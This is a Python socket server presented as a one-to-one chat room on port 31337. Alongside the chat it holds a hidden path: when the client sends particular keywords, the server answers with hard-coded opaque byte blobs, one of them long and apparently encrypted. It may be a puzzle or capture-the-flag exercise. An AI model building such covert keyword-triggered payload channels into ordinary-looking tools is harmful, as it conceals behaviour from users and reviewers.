import socket
import sys

s = socket.socket()
host = socket.gethostname()
print(" server will start on host : ", host)
port = 31337
s.bind((host,port))
print("Server is waiting for incoming connections")
s.listen(1)
conn, addr = s.accept()
print("Recieved connection")
print("")
s_name = 'CLIENT'
print(s_name, "has joined the chat room")

def input_and_send():
    while 1:
        message = input(str("Please enter your message: "))
        conn.send(message.encode())
        print("Sent")
        print("")

import threading
background_thread = threading.Thread(target=input_and_send)
background_thread.daemon = True
background_thread.start()

for message in iter(lambda: conn.recv(1024).decode(), ''):
    print(s_name, ":", message)
    print("")
    if message == 'z11gj1':
        data = '\x91\x03\x34\xf1\x1d\x76\x44\xe3'
        conn.send(data.encode())
    elif message == '533_11s4':
        data = '\x01\xc1\xcc\x4b\xc0\x79\xbf\x77\x70\x67\x72\x3f\x82\x92\x52\x13\xcb\x16\x77\x2d\xd6\xdd\x4a\xca\xee\xe7\xa6\x69\x3f\xef\x4e\x4c\x8d\x75\xce\x31\xec\xf4\xf5\x0e\xce\x7f\xd9\x9f\x84\xad\xd5\xfa\xef\xee\x39\x8a\x1e\x6a\xe8\x82\xf1\x00\x48\x15\x95\x62\x13\xa8\x06\xb9\x3b\x39\xa2\xec\xf1\x0f\x1b\x1a\x0a\xf0\x7f\x84\x08\xf5\x30\xa3\xdd\x53\x2c\x6e\x90\x15\x18\x6e\x78\x3a\x44\x32\x2e\xcd\x76\x10\x37\x20\x70\xf3\x95\x43\x9d\xb5\xd5\x83\x14\xc2\xa4\xa9\x76\x08\xb3\x0d\x08\xeb\xe3\x2c\x6d\x0c\x68\xde\x12\x85\x0b\x34\x93\xf9\xb2\x93\xdc\xb8\x08\xd6\xd2\x6e\x74\xab\x28\xc2\xd4\x3b\x8f\xc6\x04\x7a\x71\x4d\x1c\x6e\x2d\xfd\xe7\x9b\xf2\x5f\xc6\x05\x1a\x98\x87\x37\x15\x57\xa6\x0d\x65\x37\x94\x97\x84\xb1\x90\x89\x27\x88\x1e\xd6\x66\xbe\xfe\x9a\x9f\x89\x29\x5f\x5d\x43\xd4\x80\x24\xf7\x62\x68\x60\xdd\x79\x4d\x69\x3f\xaf\xa8\x9f\x58\xa8\xcf\xc3\xde\x03\x67\xc5\x51\x1f\x6f\x36\x83\x0a\xf5\xa5\xa1\xb4\x6f\x61\x19\x6d\xd2\xdf\xdc\xf4\x8e\x7d\x5d\x8f\xc3\xcd\x92\xa8\xf9\xcb\x7e\x3d\xa1\xb9\xf0\x41\x71\x90\xc8\x3a\x9d\x1d\xec\x1e\x9c\x8d\x7e\x37\xd0\x6b\x5a\xc8\x22\x75\x6b\x61\xcc\xa8\x89\x43\x0a\x2a\x7a\x21\xbb\x07\x21\x39\x1a\x36\x53\x76\x39\xa4\x4a\x22\xd2\x7e\x4b\x71\xfe\x48\x21\x2e\x82\xf4\x4d\x74\xe4\xcf\xff\xd5\x62\x1c\xab\x88\xc0\xcd\xac\x3c\x22\x49\xe2\x95\xac\x50\xf8\x9f\x08\xe7\x03\x9e\x7f\xd0\x0b\x98\x7a\x18\x2d\x21\x00\x83\x51\x42\xf6\xda\x25\x9d\x07\x98\xac\xfb\x6f\x9e\xf3\x79\xb8\x56\xb8\x85\x55\x00\x19\x77\x6e\xec\x75\x00\x6a\x84\x7c\x3c\x5c\x78\x15\x0e\x8a\x51\x78\xb8\x0d\x0b\xc8\xc5\x82\xd8\xbf\xca\x47\xec\x2d\x0a\xca\x95\xdb\x8d\x51\x43\x4e\x14\x90\xf3\xfb\x68\xb6\xa1\xa2\x52\xcd\xc1\x8a\x7e\xbb\xb8\xb8\xa4\x3c\x79\xaa\xf0\xbc\x4f\xd3\x86\x1c\xb8\x3d\x5e\x19\xeb\x45\xaa\xf3\x6d\x1c\xfa\x62\xa4\x28\x9a\xfd\x32\x80\x6f\x1f\x9e\x5d\xaa\xc2\xcc\x53\x2d\x71\xd5\xea\x66\x0e\x6f\x3f\xce\x00\xc9\x25\x09\x18\x7c\x1f\xc8\x4d\x36\x6e\x27\xe4\x68\xd6\xb8\x19\x09\x76\x93\xbf\x1e\x99\x35\x95\x02\xd8\x9a\x42\xf0\x1e\xd5\x2b\x19\x46\x9c\x35\x91\x32\x0f\xe9\xc4\xa7\x7d\x16\xdf\xfe\x86\x1f\xd6\xb3\x93\xaa\x67\x89\x4e\x0e\xbe\x38\xb5\xa2\xce\x00\xb2\x22\x0b\xa4\x24\xe8\xcc\x1a\x57\x0d\x11\xa5\x24\x78\x89\x20\x86\x69\xb0\x1f\xb1\xa1\xeb\xfe\x2f\xe9\x8f\xef\x29\x89\xeb\xcb\x72\x35\xfa\xb2\x27\xf5\x3b\x35\xb0\x12\x0f\xa6\x50\x2a\x0e\x67\xda\xac\xde\x00\x8b\x2b\x2c\xc8\x25\xa7\xb3\xb6\xea\x7d\xd0\x0a\x14\x26\x31\xd3\xab\x45\xff\x66\xca\x97\x47\xab\xa6\x4a\x48\xd3\x95\x64\x3c\xe2\xd6\xab\x7b\x5e\xc8\x1b\x37\x49\x5e\x87\xfb\x0b\x76\x50\xda\xfc\x1c\x03\x17\x9d\x63\x05\xfe\x99\xfe\xba\x0c\x64\xab\x91\xb8\x6e\x9f\x73\x0f\x46\x08\x20\x7e\x2d\x7b\x07\x16\x88\x78\x86\x62\x8d\x94\x14\x73\x4e\x7b\xdb\xe2\x6a\xfe\x20\x60\x56\x57\x0d\x66\xd6\x86\xa2\x99\xca\xea\x08\x22\x9f\x8e\x62\xe6\x1c\xe8\x5e\x0b\x83\x25\xb6\xba\x2d\xf2\x95\x24\x90\xe2\x55\xb7\x54\x99\xd2\x6e\xbf\xc7\x8c\x54\x56\xf9\x5b\x60\xea\x43\xd6\xe7\xf5\x77\x86\x0b\x03\x26\xe3\xec\x81\xe6\xef\x2d\xee\x15\x62\x05\x02\xa6\xa2\xdc\x75\x9e\x72\x51\x8c\x4a\x74\xa7\xf9\x2a\x05\x1e\xcf\x7c\xde\xf3\xd0\x55\x8c\xe8\x5c\x35\xec\xd4\x4e\x0a\xd5\x5c\x54\x81\x1c\x6e\x4e\x1d\x03\x3d\xb4\x17\x7b\xd5\x75\xa1\xfa\xab\xb9\x6c\x67\x7f\x8a\x0c\xf5\xa5\xde\x9b\xbb\x99\xe2\x63\x65\x19\xca\x0b\x7e\x62\x26\x55\x78\xf2\x0b\x64\x9e\xa5\x3b\x6a\x4e\xe5\x2c\x64\x90\x80\xc6\x55\x15\x42\x42\x69\x42\xb7\xa9\x3a\x54\xf5\x0c\x42\xf7\xe8\x11\xd1\x82\x41\xd9\x3e\x7a\xf5\xec\xb1\x92\x17\xac\xea\x3d\x8f\xa3\x22\x09\x96\x0e\xae\xd1\x3b\x18\xd3\x73\x7b\x5b\x28\x76\x11\xa8\x3d\x79\xe5\x1d\x6a\x41\x41\xec\x9a\xc3\xdc\x11\x9d\x94\x7a\x93\x35\x81\x85\xd8\xc1\xf8\xaa\x9e\xc1\x6b\xd4\xc6\x9c\xfa\xef\x35\x65\x80\x1d\xea\xcd\x01\xdb\x42\xd0\x22\x6d\x62\xc5\xb6\x5d\xbf\x6b\x72\xbd\x4f\x0f\x39\x93\xe5\xb9\xa2\x23\xc6\x39\x5d\x2e\x3c\x42\x35\x17\x80\xef\x7f\x63\x00\x7f\x88\x4b\x95\x6e\x3e\xf2\xba\x37\xa2\x89\x49\xa2\x81\x35\x59\x53\xed\x07\x50\x03\xf9\x9e\x6a\x80\xb3\x68\x2d\xe2\xfe\xbe\x3f\x74\xc6\xc1\x19\xcb\xc7\x0d\x94\x88\x66\x88\xc8\x18\xc8\x08\x0f\x84\x15\x55\xb9\xa0\x23\xce\xaf\x5e\x6c\x41\x0e\x7f\x06\x2c\x75\xed\xd8\xd2\xa8\xcf\x03\x32\x43\x9b\x9d\x1a\x92\x9e\xd5\x88\x19\x59\x1f\x7f\x5b\x17\x8b\x6e\x0a\x33\x4b\x4e\x2f\xf0\xfd\x60\x08\x0d\xda\xe3\x93\x27\x41\x87\xcc\xd8\xb6\x34\x8f\x30\x86\xd2\xd5\xba\xd8\xbc\x2f\x66\xe2\x6a\x36\x91\x5d\x68\xf9\x8a\x91\x47\x3e\x46\xc4\x93\xc9\xcf\xde\x9c\xfb\x36\xec\xbe\x5b\x1e\x2f\x1b\xd6\x99\x20\xbb\x4f\x54\x5a\x7b\x56\x9f\x96\xb4\x87\x3c\x08\x1f\xc0\x31\xa3\xfb\x74\x94\x01\x33\xfa\x3b\xc0\x0f\x7d\x55\x22\x23\x29\xa5\xb1\x52\x34\xb5\x85\x08\xff\xf2\xb4\xdd\x7a\xd0\xba\x65\xb1\x5f\x77\x23\xb3\xbf\x32\x7a\x47\x4d\x25\xf8\x08\x76\x46\x97\x82\x07\x06\x71\xcc\x68\x8f\x6d\x76\x26\x24\xf1\x32\xd4\xbe\x51\xd0\x4e\x7b\x64\xad\x50\x0e\xfc\x03\x49\xdc\x96\x11\x6b\x52\x53\x71\xd4\xc6\x17\x05\x15\x16\x4b\x9a\xb6\xa8\x27\x18\x6e\xae\x53\x6b\xba\xcd\x73\x58\x53\xda\x7a\x2b\x4d\x7b\xe0\x83\x4c\xac\x77\x8a\xda\x3c\x4a\xc9\x96\x6d\x40\xb1\x91\xe4\x1a\x5f\xbf\x88\xff\x72\xee\x56\x67\x22\xb8\x6d\x69\xfb\x18\x6f\x0f\x51\xf9\xaf\xee\x22\x31\x2a\x71\xf1\xae\x68\xb4\x97\xee\x27\x5a\x96\x08\x9d\x41\xf1\x7d\xb4\x55\xd1\xfa\x79\x2a\x4b\xbf\x3c\x35\xc9\xa1\x17\xf4\x99\x5d\xc8\x5d\x84\x76\x02\x65\xfe\xb8\xdd\xb2\x08\xc6\x15\x74\x59\xc9\x9a\x6b\xe3\xa6\xfb\xa1\xa7\x8e\x42\x5c\x7f\x5d\xca\xa2\xa3\xc3\x80\xdb\x36\x3e\xe2\x2d\xaa\x02\x29\x52\x08\x17\x67\x0e\x4d\x8d\xbc\x28\x7b\x0e\xde\x17\x9c\x0c\x9d\x13\x20\xaa\xfa\x59\x84\x7e\x25\x6e\xcb\x54\xe6\x50\xe5\xd3\xf5\xd0\x88\xb3\x7b\xf5\xa3\x16\x48\x36\x85\xbe\xda\xf7\x28\x8f\xc9\xb7\x0c\xdd\x6a\x15\xd1\x00\xa9\xa1\xdf\x73\x40\x6d\x55\xdb\xbe\xdc\x7e\xd7\x70\xd0\x59\xc0\xf4\x6c\xfb\x69\xb8\xa7\xa5\xe8\x89\x2c\xd4\x28\x8f\x2d\xb6\x60\x12\x80\x40\x15\xa8\xbf\xfb\x84\x1d\x97\x18\xba\x6e\xc5\xaf\x37\x0b\xbb\xe6\xbd\xb8\x19\xf6\x51\x13\xf9\x5e\xb9\xb0\x09\x53\xb9\x93\x6b\xb6\x9f\x71\x64\x84\xf2\x21\x4d\xc8\x3a\x85\xb3\xef\x61\x68\x80\x93\x33\x36\xef\x8b\x99\xb9\xf0\xe7\xb1\x52\x2b\xc1\x57\x1e\x3c\xf0\xba\x9b\xce\xcc\xad\xe0\xa2\xde\x14\x6e\x8a\xb5\xe2\x46\xba\xca\x19\x67\x90\xdc\x43\xe0\x1e\x56\xee\x11\xa8\xff\xad\x51\xce\xa2\x87\x37\xa9\xb9\x80\x62\xfc\x88\xd9\x4f\xb7\x18\x1d\xb2\x6e\x23\x04\x0c\x02\x36\x54\x41\x61\x4e\x9f\x11\xd0\xdd\xa2\xa8\xec\xa9\xa1\x52\xaf\x32\xc9\x4d\x00\x8f\x4b\x66\xd1\xa0\x49\x63\xe9\x0d\xc3\x90\x30\xa4\xae\x50\x9b\x77\x8f\x92\x24\xd4\x29\x91\x5c\x1a\x43\x5a\x33\xe6\xd2\xfe\xf6\xbb\xdb\x9d\x21\xdc\x20\x78\x1b\x3c\xbb\xd6\xf7\x02\x4c\x12\x10\x98\xfd\xa9\x66\x00\x3c\xe9\x00\xc0\x50\x9b\x88\xe2\xba\x63\xcb\x03\xec\xd0\xa5\xf0\x61\x64\xfe\x51\x2c\x18\x3b\x45\x94\xa1\xcf\xc4\xa1\x5f\xcf\x8d\x87\x22\x89\x86\xb9\xf2\xe8\x99\x6c\x74\x8e\x01\x20\xc0\x7b\x15\x15\x2f\xcf\xe5\x28\x05\x85\xb9\x5d\xa4\x3a\xf1\xe9\x36\x61\xf5\x99\x71\xc2\x32\x18\x93\x64\x71\x7e\xad\x62\xaa\xea\xf2\x14\xaa\x95\x69\x55\xc9\x69\xc1\x18\x38\x75\x86\x05\x55\x93\xa0\xb3\x9f\xc0\x63\x86\x31\x93\x34\x8d\x6b\x04\x50\x62\xc9\x5f\xdb\xa4\xa0\x10\x37\x1a\x01\xa9\x24\xbe\x09\xcc\x3c\xa2\x84\x5e\xbf\x99\xf2\x57\x7f\x7b\x38\x6f\x9f\xca\xe0\xd8\x6e\xc5\xe8\x73\x65\x1c\xf1\xa8\x1e\x28\x5d\xec\x79\xa5\x97\x82\x9c\x0c\xc6\xe3\xea\xd7\x8f\x2c\x53\xa5\xea\x76\x0c\xbd\xd5\x6e\xeb\x59\xa2\x91\xb1\x62\xfe\x49\x2a\x20\xe9\x8b\x86\xc5\x76\x71\x1a\xeb\x98\x12\x65\x11\x4a\x6c\x98\x72\x5a\xd3\x9a\xaf\x93\x2b\xec\x37\x05\x8a\xb7\xd4\xfa\xe9\x9f\xd8\xfd\x1e\x0f\xe5\x29\xa1\x5b\xba\xb8\x42\x67\x7b\xf1\x1c\x2c\x3b\xef\xdc\x0a\x06\x72\x61\xe3\x59\x83\xc3\x36\x3f\xd2\xb9\x3f\x33\x97\xbe\x8c\xf1\xae\xfe\xaf\xf0\xc5\xf3\xb6\x88\x2a\x56\xd1\xcd\x0d\xa9\xb2\x02\x62\x20\x27\x7d\x2b\x52\x19\x00\x46\x83\xd3\x11\x03\xb4\x7e\x92\x58\xf5\x8b\xa2\x3e\x9e\x26\x31\x87\x44\xa6\xd3\x09\xc6\x3e\x55\xac\x5a\xbb\x3a\xf6\xc5\x08\x1c\x04\xfb\x47\x44\x78\xfb\x2d\x61\xf8\xcd\xe5\xef\x9d\xfb\x81\xd3\x98\xd2\x65\x7e\xff\x14\x24\xca\x8e\xe0\xcd\x9e\xaa\x06\x75\xd5\x88\x01\x62\xd6\x32\x41\x98\xa4\x4f\x96\x54\x86\x94\xfc\xbb\xe2\x4a\xf2\x64\x21\xa9\x79\x7d\x70\x11\x30\xd4\xc0\xd2\x6f\x11\x4f\x31\xf2\xcf\xf5\x02\xe9\x3c\x4e\xa3\xe2\x5b\xae\x9b\x73\x2d\xfc\x51\x1f\x8a\x83\x5c\x8d\x57\x42\xc9\xef\xaa\x22\x64\x9f\x2b\xfe\x25\x26\xcf\xdc\x38\xb9\x5e\xc7\xf2\xe3\x31\xf7\xdf\x47\xc8\xe6\x23\xe5\x0a\xb2\x6a\xb5\xb3\x07\xbc\x9b\xde\x55\x07\x6a\xcd\xa8\x70\x83\x83\x87\x89\x4e\xc1\xed\xc5\x74\xa8\xe9\x74\x4b\xe0\xcc\x85\x6c\xfc\x94\x2e\xac\x23\x69\x3a\xb7\xb2\xd0\xc4\xab\x53\xcb\xfb\xdf\x27\x2a\x9c\x48\xeb\x71\x3c\x25\x30\x0f\xf3\xa0\x96\xc9\x2c\xc4\xfe\x30\x7e\x10\xd7\xfd\xa6\x82\x08\x39\x73\xc8\x87\x85\x3e\x44\xdf\xe8\xe7\xf7\x6a\xeb\xef\x70\xa2\x46\x67\x31\x28\xeb\x91\x83\xda\x91\x22\x27\x63\xc7\x98\xcb\x76\x25\x51\x49\xeb\x17\x5d\x91\xc2\x5f\xae\xf4\xb7\xf5\xea\x6c\x50\x7e\x8c\x7e\xc2\x36\xc8\x72\x16\x08\x75\x6b\x75\x3e\xa5\xd8\x12\xbc\xbe\x3e\x28\x55\x36\x95\xd4\x0c\xa7\x45\x5c\xa3\xff\x44\x54\xcf\x94\x3b\x95\xe7\xe7\x1e\x8f\x5a\xd3\x81\x44\xe8\x25\x69\x59\xa5\xcd\x2d\x02\x2d\x77\x5e\x3a\x28\x25\xa9\xfd\x33\x14\xd2\x68\x0e\x02\xfb\xc9\xa3\x99\xba\xa5\x2f\xb5\xcf\x56\xb7\x52\x29\xa1\xe3\xb3\xd1\x9a\x7f\x8d\xba\x1d\xe3\x0a\x57\x1a\x30\x89\x23\x4f\xb5\xa7\x02\x9f\x1e\x5d\xf0\x4d\xf0\x18\xea\x0b\x21\xe3\xd0\xb5\x6f\xfd\xcd\x04\xb6\x52\xf1\xc8\x1a\x41\x84\x0d\xbf\x6c\xdf\x23\x5c\x16\x6f\x1e\x24\xe9\x76\x6d\xd3\x39\x89\x67\xe7\xc8\xd5\xfd\x8e\x9b\x57\xac\xab\x24\x1b\x53\xdc\x88\x5c\x16\x97\x1b\x84\x96\x6c\x05\xe8\xc4\xa3\x49\xe4\x18\x6e\xcd\x5d\x06\x6f\xb8\x3c\xd0\x72\x53\x9e\xda\x04\xfc\x66\x5c\xe2\x35\xd7\x4c\x85\x29\xab\x68\x6f\xdf\x61\xb4\x85\x27\xc4\xa7\x3b\x0a\x75\x3b\x68\x37\x56\xad\x6e\xe6\xad\x8c\xb3\xcd\x1c\x99\x51\x3d\xc3\x8e\x32\x5e\x0f\xca\x4a\x1f\xbb\x65\xf8\xcd\x21\xcb\x79\x03\x75\x6e\xde\xcc\x72\x8c\xa4\xb2\x2b\x42\x72\xdb\x87\xbf\xb2\xa4\xc3\xc4\x8b\xe5\xea\xdc\x75\xab\x1a\xfb\x16\xb6\x76\xf0\x05\x4f\x56\x2a\x39\x09\x00\xc8\xa2\xdd\x8c\x34\xfd\xe3\x17\x91\xdc\xab\x9e\x24\x28\xc8\x07\xff\x55\x79\xaa\xab\x1f\x14\xf3\xcd\xfa\x94\x2c\xed\xc4\xa8\x65\x61\x6e\x9d\x00\xde\xda\xb1\xe5\x6b\xcf\xd8\x41\x63\x27\x8c\x26\x38\xf2\x3a\x85\x3b\x8b\xe7\x8c\x5f\x7a\x18\x81\xfb\xe4\x0e\xec\xe2\xf8\xda\x05\x02\xa7\x6d\xd6\x09\xbb\x4f\xe5\x21\x25\x8d\xfa\x50\x74\xa0\xe9\xa0\xfe\xf8\xde\xe8\x8d\x1e\x40\x45\xdc\xf9\xdb\x36\x68\xad\xbb\x88\x9f\x94\x47\xcf\xdd\xe4\x19\x73\xee\x2d\x00\x30\x95\xdd\x26\x7a\xa8\x58\xe4\x98\x7e\x35\xf5\x40\xbb\xf1\xa5\xb4\xc2\xd4\x2e\x41\x25\x15\x8a\x5f\xf5\xd1\xb5\xcb\x19\x7a\xc6\xef\x30\xb0\x48\xe0\xc6\x30\x2b\x47\x72\x4c\x3d\x05\x76\x34\x80\x4d\xd9\x19\x72\x6f\xac\x90\x0d\xc0\x8a\x0f\x49\xda\xb7\xab\xb3\x6c\xeb\x46\xff\x85\x8e\x46\xf2\x20\xee\x83\x89\x2e\xc1\x7a\x27\x0e\xb4\x1b\x51\x98\x1c\x35\x90\xdc\x04\xeb\x38\xc2\x2b\x1c\xaa\x50\x1f\xc4\xa2\xdb\xae\xcb\x3c\x40\x04\xf4\x9a\x10\xb6\x79\x3c\xc5\x56\x99\x10\xd8\x51\x19\x51\x87\x05\x33\x4d\xa8\x2f\xd0\xac\xc5\x66\x61\xa5\x58\xdc\x65\xa9\x70\x63\x90\x7c\xd9\xf7\x4e\x2d\xfb\xe5\x74\x5e\xd5\x9e\xff\x0a\x9a\x9b\xe9\xd9\x07\x74\x75\xfa\x42\xa2\xcf\xf7\xcd\x41\x1d\x64\x1f\xb5\x31\xd0\x08\x20\xa7\x32\xcf\xcd\xc5\x23\x85\xbe\x5f\x2a\x38\x21\x0e\xc2\xbb\x3f\x35\xbd\xf4\x1c\xc8\x1f\x6a\xeb\xc1\xcb\xd9\x5e\x5f\x2a\x85\x69\xfc\x94\x1e\xe6\x62\x1b\xa6\x88\xf3\xa3\xd2\x0c\xf0\xd0\xee\x18\x93\x8f\x52\xee\x7b\x73\x02\xb3\x53\x78\x73\x9b\x30\xed\x92\x29\xbf\x9d\xd5\xcd\xbe\x51\x0f\xed\x35\x00\x4d\xdf\x92\xfe\x8f\x51\xec\xab\xbb\x72\x7e\x41\x3e\xf1\x1f\x44\x8f\x0d\x17\xce\x75\xdf\x56\xc5\xe5\x96\xbd\xaa\x36\xb8\x24\x32\x44\x3a\x55\xb8\xe8\xcd\x6b\x40\xc7\x01\xe3\x8b\x1e\x0c\x0c\xe6\x61\x80\xd6\xe2\xf2\xa4\xec\x77\x95\xac\x83\xf3\x10\x75\xc0\xa9\xb4\x0d\x66\xaf\xc5\x6f\xd8\x10\xe8\x5c\xfd\x53\xb0\xe1\x84\xb0\x26\xab\x3d\xe7\xe3\x17\x70\x49\x4b\x4c\x0e\xaa\xdc\x43\xfe\xa1\xf1\x8a\xb5\x1e\xc4\xb9\xc8\xfb\xd9\x40\xa0\x66\xab\xdf\x9a\x08\x9b\x10\x87\x11\xcb\x9c\x46\xb5\x0b\x2b\x5e\x86\xff\xb6\x8f\x51\xe5\x9a\x08\x31\xf1\xaf\x51\xf8\x8a\x81\x20\x71\x81\x85\x3d\x0e\xbd\x45\x26\xf4\x7b\x0b\x0c\xca\x6f\xfe\x79\xa7\xae\x87\x90\xe4\x7e\x03\x9c\xcf\x09\x20\x34\x6a\x56\xec\x43\x8f\x32\xd5\x30\x4c\x93\x2d\x0d\xbd\xbe\x03\x01\xad\xbf\xd3\x22\x3e\xf3\x38\x79\xb2\x11\xb1\x35\xb5\x2e\xbe\x26\x28\x65\x29\x28\xcf\x9c\x58\x89\xe4\x1a\x79\xb8\xc1\xc4\xa9\xc3\xcf\x02\x94\xd0\x8d\xcc\xa9\x97\x92\xfb\x23\x0a\x68\xee\x91\x61\x4d\x6e\x90\xf9\x34\x80\xbe\x93\x5e\x44\xa2\x71\x70\xc6\x1f\x58\xcb\xcd\xbf\xdd\xcb\x86\xe2\x06\x22\x6f\x0a\xed\x39\xa2\xf8\xd6\x58\x19\xae\x54\xa7\x2a\xf8\x5b\xb5\xc2\x71\x5c\xc2\x50\x62\x73\xf9\xe0\x1e\x76\x6b\xef\x49\x21\xe1\x02\xbb\x28\xed\xef\x06\x06\xaa\x26\xee\x8e\xdd\xc3\x58\x82\x38\xb2\x41\xc3\x19\x54\x2c\xd1\x2e\xc5\xa1\x2a\x84\xc5\x1d\xe9\x36\xd1\x83\x95\xee\x63\x94\x7d\x3e\xcb\xc3\xcc\xd3\x96\xbf\x04\x38\xe6\xf8\x14\x35\x56\x34\x53\x8b\x64\x52\x0e\xea\x87\xeb\xdd\x77\x91\x6f\x95\xf1\xcc\xf8\xdd\x4b\x09\x0c\x8b\x78\x6a\xc4\xf3\x18\x3e\x3d\x8b\x44\x17\x19\x5a\xf5\x39\x19\xc6\xdf\x82\xa2\x81\x19\x9a\x5f\x6d\xfe\x6b\x6f\x37\x41\x62\x38\xfd\x02\xfe\x7f\xfa\x15\x0a\x69\xa4\x7e\x15\x46\x88\x16\xc8\x9d\x4c\x59\x5f\xbf\x0b\x79\xc8\x62\xcc\x47\x9d\x01\x55\x1c\x9b\x01\x8f\x3e\xe3\xec\x2b\x70\xdb\xcc\x24\xf5\x85\x03\xa7\xa3\x15\xb1\xe9\xc8\x06\x29\xb1\x0f\xde\x3f\xc2\xeb\x40\x81\xab\x62\x3d\x33\xb2\x73\x26\x4f\x6b\xe9\x29\x57\x21\xf6\x14\x4f\x1d\x0b\x0c\x08\x03\xf2\x1a\x44\x21\x3b\x86\x55\xdc\x90\x03\xd8\xa3\x34\x34\xa9\xe7\x79\x14\x60\xc3\x3f\x7b\x4f\x16\x48\xfc\xd6\x4a\x1a\x46\xfb\xb2\x1b\xca\xb8\x42\xd6\x9e\x21\xdb\x20\x97\xce\xdf\xf0\xc8\xa6\xeb\x69\x6c\x82\xbc\x84\x19\x0a\x4a\x13\x48\x2a\x3b\xda\xaa\xd3\xa9\xa3\x79\x4d\x44\x84\xe8\xc3\x90\x00\xc0\x0f\x11\xe4\x86\x7f\x17\x5c\x1d\xa4\x25\xb7\xb9\x1f\xee\x70\x46\xa6\x20\xf4\xb1\x1b\x9f\x25\x13\x07\x60\x0a\x0e\xe1\xf6\xad\x64\x36\xeb\x7d\x48\xb5\x20\x23\xf5\x03\xb6\x20\xb7\xdb\x3f\x52\x18\x19\x3f\x11\x67\xdd\x29\x78\x88\x0c\x3a\x0c\x7d\xa1\xed\xc3\x1c\x9f\xa6\x06\x57\x9e\x91\x7e\xb9\xf0\x41\x8c\x19\xe2\x8e\xc9\x65\x68\x2b\xa5\x81\xc7\x10\xe0\xc9\xbc\x6e\x2d\x5e\xe6\xf1\x03\x8c\x97\x57\xb9\x67\x05\x94\xa7\x4d\x56\xfc\x5d\xc3\x13\x92\x2c\xf2\x13\x2e\x66\x85\x53\xdc\x99\x32\xdd\x9d\x9b\x12\x27\x4a\xee\xe1\xa9\xca\x8f\x2c\x48\x49\xf9\x04\x65\x8d\x98\x3a\xe1\x94\x97\x2d\x07\x6c\x74\x86\xbf\x65\x7d\xed\xa8\x0a\xb3\xd4\x2f\xd8\x68\x9f\x60\xbf\x75\xaf\x9d\xf3\xc9\x57\xbd\xac\x0f\x33\x9f\xd0\x2b\xf2\x3d\xa7\x20\xec\xa2\x8d\x01\x37\x2a\x76\xaf\xa3\x72\x16\x3a\xf7\xbf\xa3\xad\x85\xbc\x59\xfc\x0b\x03\xb4\x7f\x45\x44\xa4\x87\xa9\xa5\x4b\xea\x3f\xcf\x7c\xab\x09\x0b\xe8\xfa\x48\x3e\xad\xdd\x56\x31\x80\x7f\x93\x3f\x4f\xdf\xc2\x15\xba\xe4\x80\xac\x07\x5c\xb6\x0f\x44\x6d\xf8\x80\x93\x37\xc1\xfd\xe7\x1f\x55\xcc\x1e\x79\xbc\x57\x01\xde\x15\x41\xfe\xc0\xa4\x16\x48\xf6\xeb\x0c\xb3\x21\x27\x4f\xd3\x42\x02\xdd\x98\x6f\x3b\x56\xfa\x52\x45\x84\x0f\x56\x72\x65\xab\x11\x3c\x8f\xde\x07\x8c\x3e\x59\x4a\x2b\x3b\x67\x5f\xc8\x37\xd8\xba\x5f\x48\xf5\xb9\x91\x29\xbc\x6d\x13\xc8\x71\x41\x5e\xca\xd8\x05\x02\xff\x94\x30\x05\xce\x95\x3a\xd5\xf1\x35\xaf\x9c\x48\x27\x3a\x7b\x81\xfe\x9f\xdf\xa8\xec\x97\x94\xaa\xd0\xab\x7b\x0b\x9a\x8c\x95\xea\xd7\x40\xbc\x8c\x2f\x28\xe3\xea\xff\x48\x18\xc4\x91\x6d\x86\xca\xa0\xa7\x57\xff\x17\xe7\xd1\x95\xb4\x07\xcc\x37\x7a\x94\x4a\x63\xae\x4e\x8f\x89\xb2\xfd\xca\x45\x82\x82\xdc\xc7\x5a\x6f\xde\x58\x27\xb7\xa9\x49\xaa\xe1\x15\xd4\x5a\xe0\x69\x91\xdf\x9b\x9d\x6a\x78\x5b\x1a\x29\x25\x63\xd8\x16\xc8\xe3\x58\x59\xf5\x21\x80\x26\x1c\xd9\xdb\x07\x5d\x24\x70\x88\x9a\xc8\x00\x26\xf9\xb2\x92\xfb\xe7\x65\x06\x6b\x28\x63\xf7\xbd\x02\xe9\xa9\x6f\x7d\xca\x1f\x79\x93\xbd\x43\x9e\x95\x89\x2c\x07\x61\x96\x88\x22\x35\xc4\x34\x22\x1f\xde\x74\xeb\x07\xd6\x86\xad\xde\x51\x00\xf2\xc5\xe3\xef\xac\xbb\xfb\x95\x18\x04\x6b\x33\x17\xea\x6f\x78\x39\x6c\x96\x6f\x6e\xfe\x64\xba\xac\x40\x63\xb1\x97\x32\x5b\xee\xf2\x40\x54\xb2\x31\xa7\x6d\xd8\xdb\x80\x5d\x1e\x3f\x42\x0f\x95\x33\x0f\xbe\x20\xd5\x15\xe1\x94\x04\x45\x6a\xa4\x24\xf2\x58\x61\x41\x18\xa5\x02\xc2\xb6\x29\xd4\xaa\x9d\x7a\xb8\xda\x61\x62\x57\x6c\x03\x5a\x7d\x5b\xd6\xb1\xef\x14\x27\x9c\x18\x07\x85\xbc\xbe\x82\x41\x64\x5e\xf9\x47\xb2\x5c\x41\x27\x6c\xee\x5d\x7e\x91\x09\x48\xc1\x9d\xaa\x3e\x82\xcb\x53\xa7\x38\x81\x06\x16\xc7\x0f\x0c\xad\x96\x0b\x22\x03\x97\x84\xfd\x02\x38\xec\x9c\x71\x30\x43\xfa\x41\xc8\xcf\xfd\x22\x39\xd7\xcd\x7e\x79\x00\x4b\x1c\x40\xa3\x66\x23\x69\xf3\x9e\x5d\x85\xf7\xcf\x9f\xee\x08\x95\x75\x27\x4b\x86\xde\xad\x54\x9c\x4c\x6a\x5d\x94\x09\x34\x58\x11\x3c\x25\x0d\x7a\x90\xed\x2e\x7b\xee\xfe\x43\x6b\x58\xe5\x59\x65\x29\xe8\x22\x90\x33\xab\x59\x6d\x5f\xf4\xf0\x61\xba\x05\xaf\xf3\xb4\xe6\xb9\x29\x0b\xf2\xf7\xee\x92\xab\x4c\x7c\x63\xf7\x8f\xe0\x1e\x4e\x6c\x43\xbf\x07\x09\x9f\x61\x86\xc0\x3b\x2d\xf9\x2e\x1d\x85\xcb\x19\xe3\xf3\xb3\xaf\x97\x8d\x8c\x42\x8a\xd3\x64\x1e\xbb\x48\x78\x43\x3f\x89\xa5\xa8\x6e\x1d\x21\x6c\xbc\x3e\x3c\xdb\xc0\x5f\xda\x2d\x3c\xa4\xd2\xa0\xd4\x07\x55\x0f\x91\x38\x2d\x49\xa5\x62\x34\x1f\x26\xc9\xab\x1c\x84\x90\xb2\xce\xe1\x37\x37\x2b\x05\x79\x5f\x8a\x6d\x6f\xb1\xe5\xea\x00\xd4\x27\x19\x7f\xd2